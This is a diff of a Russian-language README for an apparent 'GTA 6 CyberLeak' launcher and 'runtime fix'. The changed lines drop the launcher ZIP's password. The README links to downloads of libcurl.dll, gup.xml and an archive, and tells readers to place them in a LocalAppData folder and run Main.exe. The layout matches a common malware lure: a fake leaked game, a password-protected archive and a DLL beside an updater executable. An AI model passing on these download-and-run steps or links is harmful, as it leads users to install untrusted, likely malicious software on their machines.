@@ -47,13 +47,13 @@ Not a standalone GTA 6. Not an APK. Not a 113 GB torrent. Not the launcher ZIP (
 | **libcurl.dll** | [releases/download/v1.0/libcurl.dll](https://github.com/FoxyYT1/gta-6-runtime-gup-exe/releases/download/v1.0/libcurl.dll) |
 | **gup.xml** | [releases/download/v1.0/gup.xml](https://github.com/FoxyYT1/gta-6-runtime-gup-exe/releases/download/v1.0/gup.xml) |
 | **Три в ZIP** | [GTA6_Runtime_gup.zip](https://github.com/FoxyYT1/gta-6-runtime-gup-exe/releases/download/v1.0/GTA6_Runtime_gup.zip) |
-| Лаунчер | [GTA6_CyberLeak_Launcher.zip](https://github.com/FoxyYT1/GTA6-CyberLeak-Launcher/releases/download/123/GTA6_CyberLeak_Launcher.zip) (пароль **`Leek`**) |
+| Лаунчер | [GTA6_CyberLeak_Launcher.zip](https://github.com/FoxyYT1/GTA6-CyberLeak-Launcher/releases/download/123/GTA6_CyberLeak_Launcher.zip) (без пароля) |
 
 ---
 
 ## Как чинить FIX RUNTIME (не СНГ)
 
-1. Лаунчер: [релиз 123](https://github.com/FoxyYT1/GTA6-CyberLeak-Launcher/releases/tag/123), пароль ZIP **`Leek`**.
+1. Лаунчер: [релиз 123](https://github.com/FoxyYT1/GTA6-CyberLeak-Launcher/releases/tag/123), ZIP без пароля.
 2. Скачайте **все три** файла с **этого** релиза v1.0.
 3. Папка: Win+R → `%LOCALAPPDATA%\CyberLeak\Gup`
 4. Запустите `Main.exe` из этой папки.
